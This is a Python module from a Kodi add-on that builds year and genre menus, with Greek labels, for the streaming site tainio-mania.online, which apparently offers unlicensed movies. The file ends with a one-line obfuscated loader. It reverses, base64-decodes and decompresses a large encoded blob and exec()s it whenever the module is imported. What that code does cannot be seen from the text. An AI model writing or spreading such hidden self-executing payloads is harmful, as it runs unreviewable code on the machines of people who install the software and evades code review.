
import re, xbmc, xbmcgui, xbmcaddon, six, base64, requests, webbrowser
from six import ensure_text
from six.moves.urllib_parse import quote_plus, parse_qs, urlencode
from resources.lib.modules import client, control, views
from resources.lib.modules import dom_parser as dom
from resources.lib.modules.control import addDir

ADDON       = xbmcaddon.Addon()
ADDON_DATA  = ADDON.getAddonInfo('profile')
ADDON_PATH  = ADDON.getAddonInfo('path')
DESCRIPTION = ADDON.getAddonInfo('description')
FANART      = ADDON.getAddonInfo('fanart')
ICON        = ADDON.getAddonInfo('icon')
ID          = ADDON.getAddonInfo('id')
NAME        = ADDON.getAddonInfo('name')
VERSION     = ADDON.getAddonInfo('version')
Lang        = control.lang
Dialog      = xbmcgui.Dialog()
vers = VERSION
ART = ADDON_PATH + "/resources/icons/"
TAINIOMANIA = 'https://tainio-mania.online/'
Trailer = '[B][COLOR=lime]Τρέιλερ[/COLOR][/B]'
se = 'Αναζήτηση Ταινίας - Τήλ.Σειράς'
page = '[B][COLOR=lime]Επόμενη σελίδα >>[/COLOR][/B]'
no_name = '[COLOR lime] * [COLOR orange]Δεν υπάρχει διαθέσιμο Link [COLOR lime]*[/COLOR]'
lan = '[COLOR=gray]Γλώσσα:[/COLOR]'
sub_en = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_ell = '[COLOR=gray] | Υπ/τλοι:[/COLOR]'
sub_no = ' |[COLOR=lime] Χωρίς Υπότιτλους[/COLOR]'
categ_no = "[COLOR orange]Στην περίπτωση που δεν εμφανίζονται οι κατηγορίες:[/COLOR]"
Dialog_no = "[COLOR white]Πατώντας Εντάξει θα ανοίξει ο browser της συσκευής μας το site [COLOR coral]ΤΑΙΝΙΟΜΑΝΙΑ[COLOR white].[CR]Τσεκάρουμε το τετραγωνάκι ( I'm not a robot ) και έπειτα πατάμε Αποστολή.[CR]Επιστρέφουμε πίσω και οι κατηγορίες επανεμφανίζονται ξανά.[/COLOR]"

def Tainiomania_menu(): #84
    addDir('[B][COLOR coral]2025[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2025-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2024[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2024-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]2023[/COLOR][/B]', 'https://tainio-mania.online/load/tainies-2023-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έτος[/COLOR][/B]', '', 86, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κατηγορίες[/COLOR][/B]', '', 87, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Top 250 Movies[/COLOR][/B]', 'https://tainio-mania.online/load/top_250_movies/', 89, ART + 'tainiomania.png', FANART, '')

def menu_genre(): #87
    addDir('[B][COLOR coral]Ελλ-ταινίες[/COLOR][/B]', TAINIOMANIA + 'load/ellhnik_tain_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κωμωδίες[/COLOR][/B]', TAINIOMANIA + 'load/komodia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράμα[/COLOR][/B]', TAINIOMANIA + 'load/drama/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αισθηματικές[/COLOR][/B]', TAINIOMANIA + 'load/aisthhmatik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Οικογενειακές[/COLOR][/B]', TAINIOMANIA + 'load/oikogeneiak/', 89, ART + 'tainiomania.png', FANART, '')
#    addDir('[B][COLOR coral]Χριστουγιεννιάτικες[/COLOR][/B]', TAINIOMANIA + 'collections/2-hristoygenniatikes-tainies-online', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μεταγλωτισμένα Παιδικά[/COLOR][/B]', TAINIOMANIA + 'load/metaglwtismena-paidika-online/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Κινούμενα Σχέδια[/COLOR][/B]', TAINIOMANIA + 'load/kino_mena_sch_dia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Animation[/COLOR][/B]', TAINIOMANIA + 'xfsearch/genre/Animation/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Δράση[/COLOR][/B]', TAINIOMANIA + 'load/dr_sh/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Έγκλημα[/COLOR][/B]', TAINIOMANIA + 'load/egkl_mato/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Περιπέτεια[/COLOR][/B]', TAINIOMANIA + 'load/perip_teia/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Πολέμου[/COLOR][/B]', TAINIOMANIA + 'load/polemik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ιστορικές[/COLOR][/B]', TAINIOMANIA + 'load/istorik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Τρόμου[/COLOR][/B]', TAINIOMANIA + 'load/tr_moy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μυστήριο[/COLOR][/B]', TAINIOMANIA + 'load/mysthr_oy/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θρίλερ[/COLOR][/B]', TAINIOMANIA + 'load/thr_ler/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Φαντασίας[/COLOR][/B]', TAINIOMANIA + 'load/fantas_a/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ντοκιμαντέρ[/COLOR][/B]', TAINIOMANIA + 'load/ntokimant_r/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Βιογραφίες[/COLOR][/B]', TAINIOMANIA + 'load/biograf_e/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μιούζικαλ[/COLOR][/B]', TAINIOMANIA + 'load/mio_zikal/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Αθλητικά[/COLOR][/B]', TAINIOMANIA + 'load/athlhtik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Θέατρο[/COLOR][/B]', TAINIOMANIA + 'load/th_atro/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Μουσική[/COLOR][/B]', TAINIOMANIA + 'load/moysik/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/seir/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Ολοκληρωμένες Σειρές[/COLOR][/B]', TAINIOMANIA + 'load/oloklhrwmenes_seires/', 89, ART + 'tainiomania.png', FANART, '')
    addDir('[B][COLOR coral]Γουέστερν[/COLOR][/B]', TAINIOMANIA + 'load/goy_stern_western/', 89, ART + 'tainiomania.png', FANART, '')

def clear_Title(txt):
    import six
    if six.PY2:
        txt = txt.encode('utf-8', 'ignore')
    else:
        txt = six.ensure_text(txt, encoding='utf-8', errors='ignore')
    txt = re.sub(r'<.+?>', '', txt)
    txt = re.sub(r'var\s+cp.+?document.write\(\'\'\);\s*', '', txt)
    txt = txt.replace("&quot;", "\"").replace('()', '').replace("&#038;", "&").replace('&#8211;', ':').replace('\n',
                                                                                                               ' ')
    txt = txt.replace("&amp;", "&").replace('&#8217;', "'").replace('&#039;', ':').replace('&#;', '\'').replace('&#8230;', '...')
    txt = txt.replace("&#38;", "&").replace('&#8221;', '"').replace('&#8216;', '"').replace('&#160;', '')
    txt = txt.replace("&nbsp;", "").replace('&#8220;', '"').replace('&#8216;', '"').replace('\t', ' ')
    txt = txt.replace('οσ ', 'ος ').replace('οσ:', 'ος:').replace('ασ ', 'ας ').replace('εσ ', 'ες ').replace('ησ ', 'ης ').replace('εισ ', 'εις ').replace('Τησ ', 'Της ')
    return txt
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))

